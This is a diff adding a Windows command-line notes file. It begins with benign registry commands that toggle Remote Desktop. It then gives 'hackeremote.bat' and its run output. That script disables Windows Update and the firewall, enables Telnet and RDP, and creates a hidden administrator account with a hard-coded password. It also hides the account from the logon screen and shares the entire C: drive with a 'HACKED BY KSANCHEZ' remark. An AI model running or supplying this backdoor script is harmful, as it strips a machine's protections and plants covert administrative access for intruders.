@@ -1,0 +1,115 @@
+------------------
+ Add RDP From CMD
+------------------
+
+- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+---------------
+To Disable RDP
+---------------
+
+- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+
+----------------------------
+To enable Remote assistance
+----------------------------
+
+- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+
+
+---------
+ SAMPLES
+---------
+
+E:\>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+The operation completed successfully.
+
+
+---------------------------------
+ SCRIPTS hackeremote.bat XP/W2k3
+---------------------------------
+
+@echo off
+
+REM ****************
+REM Disable off "AUTO UPDATE"
+REM ****************
+sc config wuauserv start= disabled
+net stop wuauserv
+
+REM ****************
+REM Disable windows xp Firewall
+REM ****************
+netsh firewall set opmode disable 
+REM netsh advfirewall firewall set opmode disable
+
+REM ****************
+REM Enable TELNET
+REM ****************
+sc config tlntsvr start= auto
+net start telnet
+
+REM ****************
+REM Enable Remote Desktop
+REM ****************
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+REM ***************
+REM Create a HIDDEN USER usr= remotehackbyksanchez, pass= P22W0rd1234
+REM ***************
+REM net user remotehackedbyksanchez 1234 /add     :: Windows XP Weak Password
+net user hackedbyksanchez P22W0rd1234 /add       
+
+net localgroup "Administrators" /add hackedbyksanchez
+net localgroup "Users" /del hackedbyksanchez
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hackedbyksanchez /t REG_DWORD /d 0 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f
+
+REM ***************
+REM ENABLE A SHARED FOLDER
+REM ***************
+net share DataShare=c:\ /remark:"HACKED BY KSANCHEZ"
+
+---------------
+ OUTPUT SCRIPT
+---------------
+
+E:\>hackremote.bat
+hackremote.bat
+[SC] ChangeServiceConfig SUCCESS
+The Windows Update service is stopping.
+The Windows Update service was stopped successfully.
+
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at http://go.microsoft.com/fwlink/?linkid=121488 .
+
+Ok.
+
+[SC] OpenService FAILED 1060:
+
+The specified service does not exist as an installed service.
+
+The service name is invalid.
+
+More help is available by typing NET HELPMSG 2185.
+
+The operation completed successfully.
+The account already exists.
+
+More help is available by typing NET HELPMSG 2224.
+
+System error 1378 has occurred.
+
+The specified account name is already a member of the group.
+
+The command completed successfully.
+
+The operation completed successfully.
+The operation completed successfully.
